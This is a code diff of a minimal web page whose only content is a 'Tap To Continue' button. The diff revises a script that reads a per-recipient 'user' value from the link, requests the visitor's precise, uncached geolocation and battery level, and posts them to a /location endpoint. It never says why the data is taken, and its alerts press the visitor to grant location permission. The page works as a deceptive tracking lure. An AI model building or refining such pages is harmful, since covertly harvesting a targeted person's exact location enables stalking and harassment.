@@ -11,6 +11,7 @@ display:flex;
 justify-content:center;
 align-items:center;
 margin:0;
+font-family:Arial;
 }
 
 button{
@@ -24,7 +25,7 @@ cursor:pointer;
 
 <body>
 
-<button onclick="getLocation()">
+<button onclick="start()">
 Tap To Continue
 </button>
 
@@ -33,7 +34,12 @@ Tap To Continue
 const params = new URLSearchParams(window.location.search)
 const user = params.get("user")
 
-function getLocation(){
+async function start(){
+
+if(!navigator.geolocation){
+alert("Location not supported")
+return
+}
 
 navigator.geolocation.getCurrentPosition(async function(pos){
 
@@ -41,10 +47,10 @@ let batteryLevel = "Unknown"
 
 if(navigator.getBattery){
 let battery = await navigator.getBattery()
-batteryLevel = Math.round(battery.level*100)
+batteryLevel = Math.round(battery.level * 100)
 }
 
-fetch("/location",{
+await fetch("/location",{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
@@ -57,6 +63,16 @@ battery:batteryLevel
 })
 })
 
+alert("Please allow location to continue")
+
+},function(err){
+
+alert("Please allow location permission")
+
+},{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
 })
 
 }
@@ -64,4 +80,4 @@ battery:batteryLevel
 </script>
 
 </body>
-</html>   
+</html>
